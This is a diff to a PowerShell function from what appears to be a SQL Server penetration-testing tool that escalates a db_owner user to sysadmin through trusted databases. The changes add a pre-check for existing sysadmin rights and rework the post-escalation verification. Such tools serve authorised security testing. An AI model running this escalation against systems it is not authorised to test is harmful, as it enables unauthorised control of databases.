@@ -112,9 +112,27 @@ function Invoke-SqlServerDbElevateDbOwner
     # -----------------------------------------------
 
     # Create data table to house list of trusted databases owned by a sysadmin  
+    $IsSysAdmin = New-Object System.Data.DataTable
     $TableDatabases = New-Object System.Data.DataTable 
     $TableDBOwner = New-Object System.Data.DataTable 
     $CheckforSysadmin = New-Object System.Data.DataTable 
+
+    # -----------------------------------------------
+    # Check if user is already a sysadmin
+    # -----------------------------------------------
+    $QueryElevate = "select is_srvrolemember('sysadmin') as IsSysAdmin"
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+    $results = $cmd.ExecuteReader() 
+    $IsSysAdmin.Load($results) 
+    $conn.Close() 
+    $IsSysAdmin | Select-Object -First 1 IsSysAdmin | foreach {
+
+        $Checksysadmin = $_.IsSysAdmin
+        if ($Checksysadmin -ne 0){
+                write-host "[*] You're already a sysadmin - no escalation needed." -foreground "green"
+                Break             
+        }
+    }
 
     # -----------------------------------------------
     # Get a list of trusted databases owned by a sysadmin 
@@ -133,6 +151,7 @@ function Invoke-SqlServerDbElevateDbOwner
     write-host "[*] Enumerating accessible trusted databases owned by sysadmins..."
 
     # Query the databases and load the results into the TableDatabases data table object
+    $conn.Open()
     $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn)
     $results = $cmd.ExecuteReader()
     $TableDatabases.Load($results)
@@ -140,7 +159,7 @@ function Invoke-SqlServerDbElevateDbOwner
     # Check if any accessible databases where found 
     if ($TableDatabases.rows.count -eq 0){
 
-	    write-host "No accessible databases found." -foreground "red"
+	    write-host "[*] No accessible databases found." -foreground "red"
         Break
     }else{
 	    $DbCount = $TableDatabases.rows.count      
@@ -247,20 +266,24 @@ function Invoke-SqlServerDbElevateDbOwner
         $conn.Close() 
 
 		# Verify that privilege escalation works
-        $conn.Open()
-        $QueryElevate = "select is_srvrolemember('sysadmin')"
-		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-		$results = $cmd.ExecuteReader() 
-        $CheckforSysadmin.Load($results) 
-        $conn.Close() 
-        
-        if ($CheckforSysadmin -ne 0){
-            write-host "[*] Success! - $UsertoElevate is now a sysadmin." -foreground "green" 
-            
-        }else{
-            write-host "[*] Sorry, something failed, no sysadmin for you." -foreground "red" 
-        }
-           
+        If (-Not ($newuser -and $newPass)){
+            $conn.Open()
+            $QueryElevate = "select is_srvrolemember('sysadmin') as IsSysAdmin"
+		    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+		    $results = $cmd.ExecuteReader() 
+            $CheckforSysadmin.Load($results) 
+            $conn.Close() 
+
+            $CheckforSysadmin | Select-Object -First 1 IsSysAdmin | foreach {
+
+                $Checksysadmin2 = $_.IsSysAdmin
+                if ($Checksysadmin2 -ne 0){
+                    write-host "[*] Success! - $UsertoElevate is now a sysadmin." -foreground "green" 
+                }else{
+                    write-host "[*] Sorry, something failed, no sysadmin for you." -foreground "red"
+                }
+            }    
+         }       
     }else{
          write-host "[*] Sorry, $ConnectUser doesn't have the db_owner role in any of the sysadmin databases." -foreground "red" 
     }
